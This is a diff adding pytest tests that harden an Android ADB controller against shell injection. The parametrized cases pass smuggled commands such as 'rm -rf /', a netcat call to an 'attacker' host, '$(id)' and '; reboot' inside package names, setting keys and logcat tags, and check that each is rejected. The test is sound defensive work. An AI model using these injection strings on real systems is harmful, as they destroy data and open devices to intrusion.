@@ -511,3 +511,66 @@ class TestScreenshot:
         # Act + Assert — no PNG signature => failure, nothing written.
         assert ctrl.screenshot(out) is False
         assert not out.exists()
+
+
+# ---------------------------------------------------------------------------
+# Shell-injection hardening — identifier allow-list + shlex.quote
+# ---------------------------------------------------------------------------
+
+
+class TestShellInjectionHardening:
+    """Caller strings must not be able to break out of the device shell."""
+
+    @pytest.mark.parametrize(
+        ("call", "arg"),
+        [
+            ("clear_data", "com.evil;rm -rf /"),
+            ("force_stop", "pkg name"),
+            ("start_app", "pkg|nc attacker 1"),
+            ("get_property", "ro.prod$(id)"),
+        ],
+    )
+    def test_identifier_methods_reject_shell_metacharacters(
+        self, mock_adb: PoisonPillADB, call: str, arg: str
+    ) -> None:
+        # Arrange — only the construction probe is registered; a rejected call
+        # must raise BEFORE it ever shells out (so the poison-pill never fires).
+        mock_adb.register(["adb", "version"], stdout="v1\n")
+        ctrl = ADBController()
+
+        # Act + Assert
+        with pytest.raises(ValueError, match="Invalid"):
+            getattr(ctrl, call)(arg)
+
+    def test_set_setting_rejects_unsafe_key(self, mock_adb: PoisonPillADB) -> None:
+        mock_adb.register(["adb", "version"], stdout="v1\n")
+        ctrl = ADBController()
+        with pytest.raises(ValueError, match="Invalid key"):
+            ctrl.set_setting("system", "brightness; reboot", "10")
+
+    def test_logcat_rejects_unsafe_tag(self, mock_adb: PoisonPillADB) -> None:
+        mock_adb.register(["adb", "version"], stdout="v1\n")
+        ctrl = ADBController()
+        with pytest.raises(ValueError, match="Invalid logcat tag"):
+            ctrl.logcat(filter_tag='Tag" ; rm -rf /')
+
+    def test_valid_identifier_still_accepted(self, mock_adb: PoisonPillADB) -> None:
+        # A well-formed dotted package name must pass through unchanged.
+        mock_adb.register(["adb", "version"], stdout="v1\n")
+        mock_adb.register(["adb", "shell", "pm clear com.example.app"], stdout="Success\n")
+        ctrl = ADBController()
+        assert ctrl.clear_data("com.example.app") is True
+
+    def test_path_argument_is_shell_quoted(self, mock_adb: PoisonPillADB) -> None:
+        # A path containing a space is quoted so the device shell keeps it one arg.
+        mock_adb.register(["adb", "version"], stdout="v1\n")
+        mock_adb.register(["adb", "shell", "ls -la '/sdcard/my dir'"], stdout="")
+        ctrl = ADBController()
+        ctrl.ls("/sdcard/my dir")  # must not raise UnmockedADBCallError
+
+    def test_input_text_is_shell_quoted(self, mock_adb: PoisonPillADB) -> None:
+        # Multi-word text is shlex-quoted rather than passed with broken escaping.
+        mock_adb.register(["adb", "version"], stdout="v1\n")
+        mock_adb.register(["adb", "shell", "input text 'hello world'"], stdout="")
+        ctrl = ADBController()
+        ctrl.input_text("hello world")  # must not raise UnmockedADBCallError
